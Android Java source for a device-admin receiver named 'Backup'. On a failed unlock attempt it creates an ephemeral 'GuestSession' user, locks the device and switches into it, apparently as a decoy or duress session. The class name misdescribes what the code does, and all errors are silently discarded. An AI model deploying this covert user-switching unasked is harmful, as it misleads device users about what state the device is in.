package test.backup;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.provider.Settings;
import android.util.Log;

public class Backup extends DeviceAdminReceiver {
    
    @Override
    public void onPasswordFailed(Context context, Intent intent, UserHandle failedUser) {
        super.onPasswordFailed(context, intent, failedUser);
        
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = getWho(context);

        try {
            dpm.setGlobalSetting(adminComponent, Settings.Global.WINDOW_ANIMATION_SCALE, "0");
            dpm.setGlobalSetting(adminComponent, Settings.Global.TRANSITION_ANIMATION_SCALE, "0");
            dpm.setGlobalSetting(adminComponent, Settings.Global.ANIMATOR_DURATION_SCALE, "0");

            int flags = DevicePolicyManager.SKIP_SETUP_WIZARD | DevicePolicyManager.MAKE_USER_EPHEMERAL;
            
            UserHandle ephemeralUser = dpm.createAndManageUser(
                    adminComponent,
                    "GuestSession",
                    adminComponent,
                    null,
                    flags
            );

            if (ephemeralUser != null) {
                dpm.startUserInBackground(adminComponent, ephemeralUser);

                dpm.lockNow();

                Thread.sleep(150); 

                dpm.switchUser(adminComponent, ephemeralUser);
                
            }

        } catch (Exception e) {}
    }
}
